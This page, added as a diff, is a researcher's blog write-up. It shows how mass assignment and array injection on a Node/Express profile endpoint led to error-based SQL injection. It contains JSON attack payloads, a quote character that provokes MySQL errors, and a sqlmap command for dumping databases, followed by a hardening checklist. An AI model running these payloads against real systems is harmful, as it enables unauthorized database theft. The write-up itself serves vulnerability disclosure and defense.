@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+<title>From Mass Assignment to Database Dump: When Type Confusion Becomes SQLi — thevillagehacker</title>
+<meta name="description" content="How a profile-update mass-assignment bug, array injection, and verbose MySQL errors chained into error-based SQL injection and full database extraction on a Node/Express app."/>
+<link rel="icon" href="/assets/images/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="/assets/images/favicon-32.png" type="image/png" sizes="32x32">
+<link rel="apple-touch-icon" href="/assets/images/apple-touch-icon.png" sizes="180x180">
+<meta name="theme-color" content="#0a090b"/>
+
+<!-- Critical black + red cyber fallback if stylesheet is slow/missing -->
+<style>
+  html,body{background:#0a090b;color:#e8e2e4;}
+  body{font-family:"Helvetica Neue",Inter,ui-sans-serif,system-ui,sans-serif;line-height:1.6;margin:0;}
+  a{color:#ff2a3d;}
+</style>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+<link rel="stylesheet" href="/assets/css/style.css"/>
+
+<style>
+/* Token colors for highlight.js — black + red cyber (window chrome lives in style.css) */
+.hljs-keyword{color:#c792ea !important;}
+.hljs-string{color:#ecc48d !important;}
+.hljs-title{color:#ff6b7a !important;}
+.hljs-comment{color:#5c5458 !important;}
+.hljs-number{color:#f78c6c !important;}
+.hljs-built_in{color:#ff8a96 !important;}
+.hljs-attr{color:#ffcb6b !important;}
+.hljs-attribute{color:#ffcb6b !important;}
+.hljs-meta{color:#ff2a3d !important;}
+.hljs-literal{color:#ff8a96 !important;}
+.hljs-name{color:#ff6b7a !important;}
+.hljs-tag{color:#ff8a96 !important;}
+.hljs-selector-tag{color:#ff2a3d !important;}
+.hljs-type{color:#ff6b7a !important;}
+.hljs-symbol{color:#ff6b7a !important;}
+.hljs-bullet{color:#ff2a3d !important;}
+.hljs-link{color:#ff2a3d !important;}
+.hljs-addition{color:#ff6b7a !important;}
+</style>
+</head>
+
+<body class="has-site-fx post-page">
+
+<nav class="top-nav landing-nav">
+    <div class="nav-inner landing-nav-inner">
+        <a href="/" class="nav-brand">
+            <span class="nav-prompt">~/</span>thevillagehacker<span class="nav-path">/posts</span>
+            <span class="status-dot" title="research post"></span>
+        </a>
+        <div class="nav-right">
+            <span class="nav-clock" id="nav-clock" aria-hidden="true"></span>
+            <a href="/" class="nav-link">Home</a>
+            <a href="/blog.html" class="nav-link nav-link-active">Blog</a>
+            <a href="https://thevillagehacker-security.gitbook.io/ctf-writeups" class="nav-link" target="_blank" rel="noopener">Writeups</a>
+        </div>
+    </div>
+</nav>
+
+<div class="advisory-banner">
+    MASS ASSIGNMENT // ARRAY INJECTION // ERROR-BASED SQLi
+</div>
+
+<div class="container post-container">
+
+<header class="header">
+
+    <span class="cve-tag">WEB APPLICATION SECURITY</span>
+
+    <h1>From Mass Assignment to Database Dump: When Type Confusion Becomes SQLi</h1>
+
+    <p class="subtitle">NODE/EXPRESS // OBJECT BINDING // MYSQL</p>
+
+    <div class="meta">
+        <div class="meta-item">
+            <div class="label">researcher</div>
+            <div class="value">Naveen Jagadeesan</div>
+        </div>
+        <div class="meta-item">
+            <div class="label">published</div>
+            <div class="value">2023-07-13</div>
+        </div>
+        <div class="meta-item">
+            <div class="label">platform</div>
+            <div class="value">Node.js / Express / MySQL</div>
+        </div>
+    </div>
+
+</header>
+
+<article>
+
+<h2 id="summary">Summary</h2>
+<p>A “simple” authenticated profile update endpoint became a <strong>database dump</strong> path. The interesting part is not mass assignment alone — it is how <strong>unsafe object binding + loose type handling + SQL string assembly + verbose errors</strong> composed into a reliable extraction channel.</p>
+<h2 id="theory-that-guided-testing">Theory that guided testing</h2>
+<p>I treat mass assignment as a <strong>type oracle</strong>:</p>
+<blockquote>
+<p>If the backend binds request JSON into a model with weak schema validation, feeding the wrong <em>shape</em> (array vs string, object vs scalar) often reveals whether values are interpolated into SQL, NoSQL operators, or ORM filters.</p>
+</blockquote>
+<p>Most programs stop at “can I set <code>role=admin</code>?”<br>
+The higher-yield question is: <strong>what does the server do when <code>email</code> is not a string?</strong></p>
+<h2 id="target-surface">Target surface</h2>
+<ul>
+<li>Stack: Node.js, Express, MySQL</li>
+<li>Feature: dynamic roles / user management for financial workflows</li>
+<li>Interesting endpoint: authenticated <code>POST /editUser</code> style profile update</li>
+</ul>
+<p>Frontend disabled email edits in the UI. The API still accepted <code>email</code> in the body — a classic client/server trust split.</p>
+<pre><code class="hljs language-http">POST /editUser HTTP/2
+Host: target.example
+Content-Type: application/json
+
+{
+  &quot;user_Id&quot;: &quot;2abaac0a-4af8-4101-a763-9d0229cafb12&quot;,
+  &quot;email&quot;: &quot;researcher@example.com&quot;,
+  &quot;Mobile&quot;: &quot;9874563217&quot;,
+  &quot;role&quot;: &quot;Analyst&quot;,
+  &quot;isActive&quot;: true
+}
+</code></pre>
+<pre><code class="hljs language-http">HTTP/1.1 200 OK
+Content-Type: application/json
+
+{&quot;Success&quot;: true, &quot;Message&quot;: &quot;User details Updated&quot;}
+</code></pre>
+<h2 id="finding-1-mass-assignment-unexpected-field-control">Finding #1 — mass assignment / unexpected field control</h2>
+<p>Even with UI locks, the backend honored attacker-controlled fields. That alone is authorization debt. But direct “set admin” style escalation was not the path that paid off.</p>
+<h2 id="finding-2-array-injection-bypasses-string-assumptions">Finding #2 — array injection bypasses “string” assumptions</h2>
+<p>Theory: validators sometimes check “email present” without <code>typeof email === 'string'</code>. Frameworks or ad-hoc code then coerce arrays poorly when building SQL.</p>
+<pre><code class="hljs language-json">{
+  &quot;user_Id&quot;: &quot;2abaac0a-4af8-4101-a763-9d0229cafb12&quot;,
+  &quot;email&quot;: [
+    &quot;researcher@example.com&quot;,
+    &quot;attacker@example.com&quot;
+  ],
+  &quot;Mobile&quot;: &quot;9874563217&quot;,
+  &quot;role&quot;: &quot;Analyst&quot;,
+  &quot;isActive&quot;: true
+}
+</code></pre>
+<p>Result: update succeeded; subsequent profile read showed the attacker-controlled mailbox winning the write.</p>
+<p>That confirmed:</p>
+<ol>
+<li>No strict schema (Joi/Zod/class-validator style) on the write path</li>
+<li>Multi-value handling without explicit policy</li>
+<li>A mutation primitive worth weaponizing further</li>
+</ol>
+<h2 id="finding-3-malformed-arrays-sql-parse-errors">Finding #3 — malformed arrays → SQL parse errors</h2>
+<p>Pushing the second array element into SQL metacharacters produced backend parse failures:</p>
+<pre><code class="hljs language-json">{
+  &quot;email&quot;: [&quot;researcher@example.com&quot;, &quot;'&quot;]
+}
+</code></pre>
+<pre><code class="hljs language-json">{
+  &quot;code&quot;: 400,
+  &quot;message&quot;: &quot;ER_PARSE_ERROR: You have an error in your SQL syntax&quot;
+}
+</code></pre>
+<p>Error disclosure was the unlock:</p>
+<ul>
+<li>Confirmed <strong>MySQL</strong></li>
+<li>Confirmed <strong>string-built SQL</strong> (or equivalent unsafe interpolation)</li>
+<li>Confirmed a <strong>boolean/error oracle</strong> suitable for automation</li>
+</ul>
+<h2 id="exploitation-error-based-extraction">Exploitation — error-based extraction</h2>
+<p>With a stable authenticated request template, the injection point was automated (sqlmap-class tooling) using the captured raw request, elevated risk/level, and tamper scripts as needed for WAF friction.</p>
+<pre><code class="hljs language-bash">python sqlmap.py \
+  -r request.txt \
+  --batch \
+  --dbs \
+  --risk 3 \
+  --level 4 \
+  --random-agent \
+  --tamper=between \
+  --proxy=http://127.0.0.1:8080
+</code></pre>
+<p>Outcome: database enumeration and content extraction through the profile update channel.</p>
+<h2 id="why-this-is-worth-publishing">Why this is worth publishing</h2>
+<p>Mass assignment writeups that stop at “I set <code>isAdmin=true</code>” are common.<br>
+This case is interesting because:</p>
+<ol>
+<li><strong>UI security theater</strong> (disabled field) hid a live API control plane.</li>
+<li><strong>Type confusion</strong> (array-as-email) was the real bypass, not a magic parameter name.</li>
+<li><strong>Verbose SQL errors</strong> converted a data bug into a full dump primitive.</li>
+<li>The path is realistic on Node apps that hand-roll validation and SQL.</li>
+</ol>
+<h2 id="root-causes">Root causes</h2>
+<ul>
+<li>Bind-all / loose DTO mapping on update endpoints</li>
+<li>Missing strict type schema (string vs array)</li>
+<li>Dynamic SQL or unsafe query construction around email updates</li>
+<li>Detailed database errors returned to clients</li>
+<li>Authorization model that trusts “I can call editUser” without field-level policy</li>
+</ul>
+<h2 id="hardening-checklist">Hardening checklist</h2>
+<ol>
+<li><strong>Allowlist assignable fields</strong> per role; never bind raw <code>req.body</code> to persistence.</li>
+<li><strong>Schema-validate types</strong> (<code>email: string.email()</code>, reject arrays/objects).</li>
+<li><strong>Parameterized queries only</strong> — no string concat for WHERE/SET fragments.</li>
+<li><strong>Generic client errors</strong>; log SQL detail server-side only.</li>
+<li><strong>Field-level authorization</strong> — “can edit profile” ≠ “can edit email/role/flags”.</li>
+<li>Regression tests that send arrays/objects for scalar fields and expect <code>400</code>.</li>
+</ol>
+<h2 id="takeaway">Takeaway</h2>
+<p>When an update endpoint accepts unexpected shapes, do not stop at privilege flags. <strong>Probe type confusion until the database complains</strong> — the complaint is often the beginning of extraction, not the end of the finding.</p>
+
+
+</article>
+
+<footer>
+    <span class="footer-text">
+        © 2023 <a href="/">thevillagehacker</a> — Naveen Jagadeesan
+    </span>
+    <span class="footer-text">
+        status: active<span class="blink"></span>
+    </span>
+</footer>
+
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+<!-- site.js: cyber mesh atmosphere · nav clock · HTTP request/response highlighter -->
+<script src="/assets/js/site.js" defer></script>
+</body>
+</html>
